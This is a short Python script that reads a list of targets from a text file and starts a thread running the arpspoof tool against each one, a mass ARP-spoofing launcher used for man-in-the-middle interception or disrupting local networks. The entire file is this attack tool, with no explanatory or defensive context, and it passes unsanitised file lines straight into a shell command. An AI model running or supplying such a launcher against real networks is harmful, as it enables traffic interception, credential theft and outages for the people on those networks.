import os
import time
import threading
file=open("a.txt")
ipx=file.readlines()

def my(x):
    os.system("arpspoof "+ipx[x])
for i in range(len(ipx)):
    time.sleep(1)
    ok=[i]
    kaishi=threading.Thread(target=my,args=ok)
    kaishi.start()
